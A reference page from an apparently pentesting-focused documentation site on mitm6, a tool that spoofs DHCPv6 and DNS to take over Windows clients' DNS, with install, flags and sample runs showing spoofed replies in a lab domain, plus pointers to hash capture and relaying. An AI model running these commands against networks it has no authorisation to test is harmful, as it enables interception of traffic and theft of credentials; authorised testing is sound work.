---
title : "Mitm6"
# pre : ' '
description : "mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server."
date : 2020-05-16T14:54:31+02:00
# hidden : true
# draft : true
weight : 230
# tags : ['']
---

---

"pwning IPv4 via IPv6" - mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server.

## Installation

```plain
sudo python3 -m pip install mitm6
```

## Usage

```plain
mitm6 [-h] [-i INTERFACE] [-l LOCALDOMAIN] [-4 ADDRESS] [-6 ADDRESS] [-m ADDRESS] [-a] [-v] [--debug] [-d DOMAIN] [-b DOMAIN] [-hw DOMAIN] [-hb DOMAIN] [--ignore-nofqdn]
```

## Flags

```plain
mitm6 - pwning IPv4 via IPv6
For help or reporting issues, visit https://github.com/fox-it/mitm6

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use (default: autodetect)
  -l LOCALDOMAIN, --localdomain LOCALDOMAIN
                        Domain name to use as DNS search domain (default: use first DNS domain)
  -4 ADDRESS, --ipv4 ADDRESS
                        IPv4 address to send packets from (default: autodetect)
  -6 ADDRESS, --ipv6 ADDRESS
                        IPv6 link-local address to send packets from (default: autodetect)
  -m ADDRESS, --mac ADDRESS
                        Custom mac address - probably breaks stuff (default: mac of selected interface)
  -a, --no-ra           Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)
  -v, --verbose         Show verbose information
  --debug               Show debug information

Filtering options:
  -d DOMAIN, --domain DOMAIN
                        Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.)
  -b DOMAIN, --blacklist DOMAIN
                        Domain name to filter DNS queries on (Blacklist principle, multiple can be specified.)
  -hw DOMAIN, --host-whitelist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Whitelist principle, multiple can be specified.)
  -hb DOMAIN, --host-blacklist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Blacklist principle, multiple can be specified.)
  --ignore-nofqdn       Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.
```

## Examples

### ATTENTION

To run mitm6 without interrupting the use of internet from the clients, you need to forward packets do this by running the following besides mitm6.

```plain
watch -n1 sudo sysctl -w net.ipv4.ip_forward=1
```

### Use tool to route whole network

Tip: use [Responder]({{< ref "responder" >}}) to capture hashes or [NTLMrelayx.py]({{< ref "ntlmrelayx-py" >}}) to relay hashes.

```plain
$ sudo mitm6

Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:00:00:00:b3]
IPv4 address: 10.10.10.45
IPv6 address: fe80::a00:27ff:fede:92b3
Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.
Unless this is what you want, specify at least one domain with -d
IPv6 address fe80::4865:1 is now assigned to mac=00:00:00:00:00:29 host=WS10.offsec.nl. ipv4=
IPv6 address fe80::4865:2 is now assigned to mac=00:00:00:00:00:26 host=DC2016.offsec.nl. ipv4=
IPv6 address fe80::4865:3 is now assigned to mac=00:00:00:00:00:27 host=DC2019.offsec.nl. ipv4=
IPv6 address fe80::4865:4 is now assigned to mac=00:00:00:00:00:2b host=kali ipv4=
IPv6 address fe80::4865:5 is now assigned to mac=00:00:00:00:00:31 host=adguard-lab ipv4=
Sent spoofed reply for client.wns.windows.com. to fe80::4865:1
Sent spoofed reply for v10.events.data.microsoft.com. to fe80::4865:1
```

### Specific target

```plain
sudo mitm6 -i eth0 -hw DC2016.offsec.nl
IPv6 address fe80::4865:2 is now assigned to mac=00:00:00:00:00:26 host=DC2016.offsec.nl. ipv4=
```

## URL List

- [GitHub.com - mitm6](https://github.com/fox-it/mitm6)
